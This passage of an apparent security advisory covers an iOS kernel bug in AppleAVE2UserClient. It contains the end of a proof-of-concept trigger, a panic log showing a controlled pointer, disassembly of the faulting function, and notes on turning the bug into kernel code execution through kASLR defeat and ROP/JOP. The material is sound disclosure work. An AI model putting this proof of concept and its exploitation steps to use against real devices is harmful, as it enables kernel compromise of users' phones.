        *(uint32_t *)(setSessionSettings_inputStruct + 0x0c) = surface_id; // ParameterSetsBuffer
        *(uint32_t *)(setSessionSettings_inputStruct + 0xd0) = surface_id; // codedHeaderCSID & codedHeaderBuffer [0]
        *(uint32_t *)(setSessionSettings_inputStruct + 0xd4) = surface_id; // codedHeaderCSID & codedHeaderBuffer [1]

        // AppleAVE2UserClient::_SetSessionSettings 
        ret = IOConnectCallStructMethod(ioconn, 
                                        7, 
                                        setSessionSettings_inputStruct, 
                                        sizeof(setSessionSettings_inputStruct), 
                                        setSessionSettings_outputStruct, 
                                        &setSessionSettings_outputStruct_size);
        NSLog(@"SetSessionSettings: %x %s", ret, mach_error_string(ret));
    }

    {
        // Trigger the bug 

        char close_inputStruct[0x4] = { 0 };
        char close_outputStruct[0x4] = { 0 };
        size_t close_outputStruct_size = sizeof(close_outputStruct);

        // AppleAVE2UserClient::_my_close 
        ret = IOConnectCallStructMethod(ioconn, 
                                        1, 
                                        close_inputStruct, 
                                        sizeof(close_inputStruct), 
                                        close_outputStruct, 
                                        &close_outputStruct_size);
        NSLog(@"my_close: %x %s", ret, mach_error_string(ret));
    }
}
```

Panic log:

```
panic(cpu 5 caller 0xfffffff007205df4): Kernel data abort. (saved state: 0xffffffe03cafaf40)
	  x0: 0x4141414142424242  x1:  0xffffffe02cb09c28  x2:  0x0000000000000000  x3:  0xffffffe02cb09c28
	  x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0xfffffff00f35bb54  x7:  0x0000000000000000
	  x8: 0x0000000000000006  x9:  0x0000000000000006  x10: 0x0000000000000001  x11: 0x0000000000080022
	  x12: 0x0000000000000022 x13: 0xffffffe00094bc08  x14: 0x0000000000080023  x15: 0x0000000000006903
	  x16: 0xfffffff00ee71740 x17: 0x0000000000000000  x18: 0xfffffff00ee79000  x19: 0x4141414142424242
	  x20: 0xffffffe02cb08000 x21: 0x0000000000000000  x22: 0xffffffe02cb09c28  x23: 0x0000000000000005
	  x24: 0xffffffe02cb2f748 x25: 0xffffffe02cb0d034  x26: 0x0000000000000050  x27: 0xffffffe004929218
	  x28: 0x0000000000000000 fp:  0xffffffe03cafb2a0  lr:  0xfffffff0069397e8  sp:  0xffffffe03cafb290
	  pc:  0xfffffff0069398dc cpsr: 0x80400304         esr: 0x96000004          far: 0x414141414242429a
```

And you can see `pc` aligns is on the `x0->0x58` instruction just before the branch:

```
0xFFFFFFF0069398CC IOSurfaceBufferMngr::CompleteFence
0xFFFFFFF0069398CC
0xFFFFFFF0069398CC                 STP             X20, X19, [SP,#-0x10+var_10]!
0xFFFFFFF0069398D0                 STP             X29, X30, [SP,#0x10+var_s0]
0xFFFFFFF0069398D4                 ADD             X29, SP, #0x10
0xFFFFFFF0069398D8                 MOV             X19, X0
0xFFFFFFF0069398DC                 LDR             X0, [X0,#0x58]                 // Faults here 
0xFFFFFFF0069398E0                 CBZ             X0, loc_FFFFFFF006939908
0xFFFFFFF0069398E4                 LDRB            W8, [X19,#0x1E]
0xFFFFFFF0069398E8                 CBNZ            W8, loc_FFFFFFF006939908
0xFFFFFFF0069398EC                 MOV             W1, #0
0xFFFFFFF0069398F0                 BL              IOFence__complete
0xFFFFFFF0069398F4                 LDR             X0, [X19,#0x58]
0xFFFFFFF0069398F8                 LDR             X8, [X0]
0xFFFFFFF0069398FC                 LDR             X8, [X8,#0x28]
0xFFFFFFF006939900                 BLR             X8
[...]
```

### Exploitation

Exploitation of this bug is fairly simple, once the sandbox-escape primitives are set up.
The code in the PoC will also work for exploitation, however the value provided in the `SetSessionSettings` buffer (0x4141414142424242) will need to be 
pointed towards a controlled kernel buffer, of which our function pointer can be loaded from. An additional heap infoleak bug could be used for the highest
guarantee of reliability. In this case, with a kASLR defeat, you can also speculate the location of the heap on a per-device basis: under high heap memory
pressure it is likely that large allocations will end up within the same memory range (`0xffffffe1XXXXXXXX`). 

Since this bug grants us PC control, it lends itself to exploitation via ROP or JOP. While this wouldn't necessarily work for A12 or newer devices featuring PAC,
the non-A12/A13 support is a limitation we already have with our sandbox escape, so this is no big problem. Also note that when building a ROP/JOP chain, the 
address of our controlled kernel buffer is within `x19`, and another controlled pointer in `x0`. This can be used as a stack pivot buffer or memory scratch space.

### Closing Words

Even with stringent sandboxing protections locking down large amounts of the kernel attack surface, many userland components still contain a large amount of 
attack surface themselves with many daemons implementing 50+ RPC's. Chaining a sandbox escape can grant access to areas of the kernel which are highly 
under-audited, as much of the focus is put into the small slice of the kernel which is directly accessible.

If you have any further questions feel free to DM @iBSparkes on Twitter, or (G)mail me at bensparkes8.

## Thank you

We would like to thank iBSparkes for writing this advisory and diving into the technical details with 08Tc3wBB.
